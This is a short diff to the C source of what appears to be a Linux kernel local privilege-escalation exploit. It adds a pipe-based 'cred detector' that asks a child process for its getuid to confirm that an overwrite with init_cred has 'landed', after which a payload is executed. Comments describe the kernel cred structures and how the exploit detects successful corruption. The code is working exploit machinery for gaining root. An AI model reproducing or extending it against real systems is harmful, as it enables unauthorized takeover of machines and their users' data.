@@ -1,4 +1,5 @@
 #include "common.h"
+#include <poll.h>
 #include "runtime_struct_offsets.h"
 #include "kernelsnitch/kernelsnitch.h"
 
@@ -66,6 +67,27 @@ volatile int g_uid0_cred_landed;
 /* Landing signal for the cred punch: /proc/<child>/status CapEff comes from
  * the SUBJECTIVE cred — a landed init_cred store flips it from all-zero to
  * full caps even while the child pipe is wedged. */
+int g_uid0_cmd_w = -1;
+int g_uid0_uid_r = -1;
+
+/* THE cred detector: ask the child itself. Writes C, reads its getuid.
+ * 0 => landed; the caller then sends G (payload exec). */
+uint32_t uid0_child_getuid_query(void) {
+  if (g_uid0_cmd_w < 0 || g_uid0_uid_r < 0)
+    return 9998;
+  uint32_t uid = 9999;
+  char c = 'C';
+  if (write(g_uid0_cmd_w, &c, 1) != 1)
+    return 9997;
+  struct pollfd pfd;
+  pfd.fd = g_uid0_uid_r;
+  pfd.events = POLLIN;
+  if (poll(&pfd, 1, 400) > 0 &&
+      read(g_uid0_uid_r, &uid, sizeof(uid)) != (ssize_t)sizeof(uid))
+    uid = 9996;
+  return uid;
+}
+
 /* 0x780 (cred) landings are invisible to status/CapEff (both read
  * real_cred via this kernel get_task_cred). The only observable: the
  * child getuid()==0 fires the payload which writes uid0_id.txt. */
